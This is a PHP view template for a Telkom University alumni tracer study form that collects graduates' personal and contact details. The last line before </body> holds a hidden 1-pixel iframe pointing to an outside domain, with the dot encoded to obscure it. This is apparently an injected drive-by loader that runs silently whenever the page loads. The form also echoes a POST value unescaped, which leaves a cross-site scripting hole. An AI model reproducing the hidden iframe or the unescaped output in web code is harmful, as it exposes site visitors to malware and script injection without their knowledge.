
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <title><?= $data['page'];?></title>

    <!-- Bootstrap core CSS -->
    <link href="<?= $this->base_url;?>public/css/bootstrap.min.css" rel="stylesheet">
  </head>

  <body class="bg-light">

    <div class="container">
      <div class="py-5">
        <img class="d-block mx-auto mb-4" src="https://getbootstrap.com/docs/4.0/assets/brand/bootstrap-solid.svg" alt="" width="72" height="72">
        <h2><center>Tracer Study</center></h2>
        <p>Kepada yth, Para alumni Telkom University Lulusan 2017, mohon kesediaannya untuk meluangkan waktu dalam menjawab 34 pertanyaan terkait situasi lulusan selama masa transisi hingga 2 (dua) tahun setelah lulus. Data ini menjadi informasi yang penting dalam kegiatan Tracer Study di Telkom University.
        <br>
        Tracer study bertujuan untuk:
        <br>
        1. Mengetahui hasil pendidikan di masa transisi
        <br>
        2. Penilaian diri terhadap penguasaan dan kompetensi
        <br>
        3. Evaluasi proses pembelajaran & kontribusi pendidikan tinggi
        <br>
        4. Data tersebut sangat dibutuhkan untuk institusi yaitu dalam kegiatan Akreditasi</p>
      </div>
				<?php if (isset($_POST['error'])) : ?>
				<div class="alert alert-danger" role="alert">
  				<?= $_POST['error'];?>
				</div>

      <div class="row">
        
				<?php endif;?>
        <div class="col-md-12 order-md-1">
          <h4 class="mb-3">Identitas Responden</h4>
          <form action="" method="post">
            <div class="row">
              <div class="col-md-6">
                <label>Nomor Induk Mahasiswa</label>
                <input type="number" class="form-control" name="nim" autocomplete="off" value="<?= $data['nim'];?>" required>
              </div>
              <div class="col-md-6">
                <label>Bulan dan Tahun Lulus</label>
                <input type="date" class="form-control" name="tanggal_lulus" autocomplete="off" required>
                
              </div>
            <div class="col-md-6">
              <label>Nama Mahasiswa</label>
              <div class="input-group">
                <div class="input-group-prepend">
                </div>
                <input type="text" class="form-control" name="nama" autocomplete="off" value="<?= $data['nama'];?>" required>                
              </div>
            </div>
            <div class="col-md-6">
              <label>Tahun Masuk</label>
              <div class="input-group">
                <div class="input-group-prepend">
                </div>
                <input type="date" class="form-control" name="tanggal_masuk" autocomplete="off" required>               
              </div>
            </div>
          
           <div class="col-md-6">
                <label>Program Studi</label>
                <select class="custom-select d-block w-100" name="prodi" autocomplete="off" required>
                  <option value="S2 Teknik Elektro Komunikasi">S2 Teknik Elektro Komunikasi</option>
                  <option value ="S2 Teknik Informatika">S2 Teknik Informatika</option>
                  <option value="S2 Manajemen">S2 Manajemen</option>
                  <option value="S1 Teknik Telekomunikasi">S1 Teknik Telekomunikasi</option>
                  <option value="S1 Teknik Elektro">S1 Teknik Elektro</option>
                  <option value="S1 Teknik Fisika">S1 Teknik Fisika</option>
                  <option value="S1 Sistem Komputer">S1 Sistem Komputer</option>
                  <option value="S1 Teknik Industri">S1 Teknik Industri</option>
                  <option value="S1 Sistem Informasi">S1 Sistem Informasi</option>
                  <option value="S1 Teknik Informatika">S1 Teknik Informatika</option>
                  <option value="S1 Ilmu Komputasi">S1 Ilmu Komputasi</option>
                  <option value="S1 Manajemen Bisnis Telekomunikasi & Informatika">S1 Manajemen Bisnis Telekomunikasi & Informatika</option>
                  <option value="S1 International ICT Business">S1 International ICT Business</option>
                  <option value="S1 Akuntansi">S1 Akuntansi</option>
                  <option value="S1 Administrasi Bisnis">S1 Administrasi Bisnis</option>
                  <option value="S1 Ilmu Komunikasi">S1 Ilmu Komunikasi</option>
                  <option value="S1 Desain Komunikasi Visual">S1 Desain Komunikasi Visual</option>
                  <option value="S1 Seni Rupa Murni">S1 Seni Rupa Murni</option>
                  <option value="S1 Desain Interior">S1 Desain Interior</option>
                  <option value="S1 Desain Produk">S1 Desain Produk</option>
                  <option value="S1 Kriya Tekstil dan Mode">S1 Kriya Tekstil dan Mode</option>
                  <option value="D3 Teknik Telekomunikasi">D3 Teknik Telekomunikasi</option>
                  <option value="D3 Teknik Informatika">D3 Teknik Informatika</option>
                  <option value="D3 Manajemen Informatika">D3 Manajemen Informatika</option>
                  <option value="D3 Teknik Komputer">D3 Teknik Komputer</option>
                  <option value="D3 Komputerisasi Akuntansi">D3 Komputerisasi Akuntansi</option>
                  <option value="D3 Manajemen Pemasaran">D3 Manajemen Pemasaran</option>
                  <option value="D3 Perhotelan">D3 Perhotelan</option>
                </select>
                
              </div> 
              </div>
              <div class="row">
              <div class="col-md-6">
                <label>Jenis Kelamin</label>
                <select class="custom-select d-block w-100" name="kelamin" autocomplete="off" required>

                  <option value="laki-laki">Laki-Laki</option>
                  <option value="perempuan">Perempuan</option>
                </select>                
              </div> 
              
               <div class="col-md-6">
              <label>Tahun Lahir</label>
              <div class="input-group">
                <div class="input-group-prepend">
                </div>
                <input type="date" class="form-control" name="tanggal_lahir" autocomplete="off" required>                
              </div>
            </div>

            <div class="col-md-6">
              <label>Alamat Email</label>
              <div class="input-group">
                <div class="input-group-prepend">
                </div>
                <input type="email" class="form-control" name="email" autocomplete="off" required>                
              </div>
            </div>

            <div class="col-md-6">
              <label>No Telepon/HP</label>
              <div class="input-group">
                <div class="input-group-prepend">
                </div>
                <input type="number" class="form-control" name="telepon" autocomplete="off" required>                
              </div>
            </div>

            <div class="col-md-6">
              <label>Akun Facebook</label>
              <div class="input-group">
                <div class="input-group-prepend">
                </div>
                <input type="text" class="form-control" name="facebook" autocomplete="off" required>                
              </div>
            </div>

            <div class="col-md-6">
              <label>Akun Twitter</label>
              <div class="input-group">
                <div class="input-group-prepend">
                </div>
                <input type="text" class="form-control" name="twitter" autocomplete="off" required>                
              </div>
            </div>

            <div class="col-md-6">
              <label>Akun LinkedIn</label>
              <div class="input-group">
                <div class="input-group-prepend">
                </div>
                <input type="text" class="form-control" name="linkedin" autocomplete="off" required>                
              </div>
            </div>
          </div>
          <hr class="mb-4">
          <button type="submit" name="submit" class=" float-right btn shadow-lg btn-primary">Submit!</button>
          </form>        
          </div>
        </div>

      <footer class="my-5 pt-5 text-muted text-center text-small">
        <p class="mb-1">&copy; 2017-2018 Company Name</p>
        <ul class="list-inline">
          <li class="list-inline-item"><a href="#">Privacy</a></li>
          <li class="list-inline-item"><a href="#">Terms</a></li>
          <li class="list-inline-item"><a href="#">Support</a></li>
        </ul>
      </footer>
    </div>

  <script src="<?= $this->base_url;?>public/js/bootstrap.js"></script>
  <script src="<?= $this->base_url;?>public/js/jquery-3.3.1.min.js"></script>

<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>
